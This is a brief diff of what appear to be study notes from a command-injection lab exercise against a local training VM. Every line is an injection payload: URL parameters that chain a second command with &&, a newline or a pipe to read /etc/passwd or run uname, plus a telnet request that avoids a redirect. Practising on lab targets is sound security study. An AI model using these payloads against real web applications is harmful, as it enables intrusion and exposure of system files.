@@ -1,0 +1,5 @@
+http://192.168.184.128/commandexec/example1.php?ip=127.0.0.1 %26%26 cat /etc/passwd    [&(urlcode)=26; ]
+http://192.168.184.128/commandexec/example2.php?ip=127.0.0.1%0acat /etc/passwd
+% telnet vulnerable 80
+GET /commandexec/example3.php?ip=127.0.0.1|uname+-a HTTP/1.0
+[the blowser use follow the redirect, so will no display, to avoid this, use telnet.]
